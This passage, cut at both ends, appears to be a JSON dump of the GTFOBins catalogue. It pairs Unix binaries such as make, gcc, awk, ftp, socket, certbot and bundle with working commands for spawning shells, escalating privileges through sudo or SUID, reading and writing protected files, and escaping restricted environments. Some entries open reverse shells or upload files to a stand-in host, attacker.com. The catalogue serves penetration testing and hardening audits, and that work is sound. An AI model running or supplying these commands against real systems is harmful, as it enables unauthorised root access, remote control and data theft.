          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "lualatex": {
    "description": "This allows to execute [`lua`](/gtfobins/lua/) code.",
    "functions": {
      "shell": [
        {
          "code": "lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "rc": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "rc -c '/bin/sh'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./rc -c '/bin/sh -p'",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo rc -c '/bin/sh'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "xmodmap": {
    "description": "The read file content is corrupted by error prints.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nxmodmap -v $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./xmodmap -v $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo xmodmap -v $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "pwsh": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "pwsh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "export LFILE=file_to_write\npwsh -c '\"DATA\" | Out-File $env:LFILE'\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo pwsh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "mosquitto": {
    "description": "The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message, thus it may not be suitable for reading arbitrary files",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nmosquitto -c \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./mosquitto -c \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo mosquitto -c \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "iftop": {
    "description": "This requires `iftop` 0.17 and the privilege to capture on some device (specify with `-i` if needed) .",
    "functions": {
      "shell": [
        {
          "code": "iftop\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "limited-suid": [
        {
          "code": "./iftop\n!/bin/sh\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo iftop\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "sash": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "sash",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./sash",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo sash",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "dstat": {
    "description": "`dstat` allows you to run arbitrary [`python`](/gtfobins/python/) scripts loaded as \"external plugins\" if they are located in one of the directories stated in the `dstat` man page under \"FILES\":\n\n1. `~/.dstat/`\n2. `(path of binary)/plugins/`\n3. `/usr/share/dstat/`\n4. `/usr/local/share/dstat/`\n\nPick the one that you can write into.\n",
    "functions": {
      "shell": [
        {
          "code": "mkdir -p ~/.dstat\necho 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >~/.dstat/dstat_xxx.py\ndstat --xxx\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "make": {
    "description": "All these examples only work with GNU `make` due to the lack of support of the `--eval` flag. The same can be achieved by using a proper `Makefile` or by passing the content via stdin using `-f -`.",
    "functions": {
      "shell": [
        {
          "code": "COMMAND='/bin/sh'\nmake -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nmake -s --eval=\"\\$(file >$LFILE,DATA)\" .\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "COMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "rpmverify": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "rpmverify --eval '%(/bin/sh 1>&2)'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "limited-suid": [
        {
          "code": "./rpmverify --eval '%(/bin/sh 1>&2)'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo rpmverify --eval '%(/bin/sh 1>&2)'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "terraform": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "terraform console\nfile(\"file_to_read\")\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo terraform console\nfile(\"file_to_read\")\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "./terraform console\nfile(\"file_to_read\")\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "c89": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nc89 -x c -E \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_delete\nc89 -xc /dev/null -o $LFILE\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "shell": [
        {
          "code": "c89 -wrapper /bin/sh,-s .",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo c89 -wrapper /bin/sh,-s .",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "nsenter": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "nsenter /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo nsenter /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "tmate": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "tmate -c /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo tmate -c /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./tmate -c /bin/sh",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "genie": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "genie -c '/bin/sh'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./genie -c '/bin/sh'",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo genie -c '/bin/sh'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "arp": {
    "description": "The read file content is corrupted by error prints.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\narp -v -f \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./arp -v -f \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo arp -v -f \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "dmesg": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ndmesg -rF \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "shell": [
        {
          "code": "dmesg -H\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo dmesg -H\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "luatex": {
    "description": "This allows to execute [`lua`](/gtfobins/lua/) code.",
    "functions": {
      "shell": [
        {
          "code": "luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "socket": {
    "description": "",
    "functions": {
      "reverse-shell": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nsocket -qvp '/bin/sh -i' $RHOST $RPORT\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "bind-shell": [
        {
          "code": "LPORT=12345\nsocket -svp '/bin/sh -i' $LPORT\n",
          "description": "It can bind a shell to a local port to allow remote network access."
        }
      ]
    }
  },
  "check_raid": {
    "description": "This is the `check_raid` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ncheck_raid --extra-opts=@$LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "gcc": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ngcc -x c -E \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        },
        {
          "code": "LFILE=file_to_read\ngcc @\"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_delete\ngcc -xc /dev/null -o $LFILE\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "shell": [
        {
          "code": "gcc -wrapper /bin/sh,-s .",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo gcc -wrapper /bin/sh,-s .",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "cmp": {
    "description": "Dump the bytes of the input file that are different from the NUL byte in a tabular format, hence this may not be suitable to read arbitrary binary files.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ncmp $LFILE /dev/zero -b -l\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "certbot": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp -d)\ncertbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp -d)\nsudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "bpftrace": {
    "description": "",
    "functions": {
      "sudo": [
        {
          "code": "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo bpftrace -c /bin/sh -e 'END {exit()}'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "sort": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nsort -m \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./sort -m \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo sort -m \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ftp": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "ftp\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-upload": [
        {
          "code": "RHOST=attacker.com\nftp $RHOST\nput file_to_send\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "RHOST=attacker.com\nftp $RHOST\nget file_to_get\n",
          "description": "It can download remote files."
        }
      ],
      "sudo": [
        {
          "code": "sudo ftp\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "xz": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nxz -c \"$LFILE\" | xz -d\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo xz -c \"$LFILE\" | xz -d\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "fold": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nfold -w99999999 \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./fold -w99999999 \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "zathura": {
    "description": "The interaction happens in a GUI window, while the shell is dropped in the terminal.",
    "functions": {
      "shell": [
        {
          "code": "zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "bundle": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "bundle help\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "export BUNDLE_GEMFILE=x\nbundle exec /bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundle exec /bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundle console\nsystem('/bin/sh -c /bin/sh')\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/Gemfile\ncd $TF\nbundle install\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo bundle help\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "perf": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "perf stat /bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./perf stat /bin/sh -p\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo perf stat /bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "top": {
    "description": "This requires that an existing configuration file is present, to create one run `top` then type `Wq`. Note down the actual configuration file path and use it in the below examples.",
    "functions": {
      "shell": [
        {
          "code": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc\ntop\n# press return twice\nreset\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "rpmdb": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "rpmdb --eval '%(/bin/sh 1>&2)'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "limited-suid": [
        {
          "code": "./rpmdb --eval '%(/bin/sh 1>&2)'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo rpmdb --eval '%(/bin/sh 1>&2)'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "awk": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "awk 'BEGIN {system(\"/bin/sh\")}'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "non-interactive-reverse-shell": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n",
          "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "non-interactive-bind-shell": [
        {
          "code": "LPORT=12345\nawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n",
          "description": "It can bind a non-interactive shell to a local port to allow remote network access."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\nawk '//' \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./awk '//' \"$LFILE\"\n",
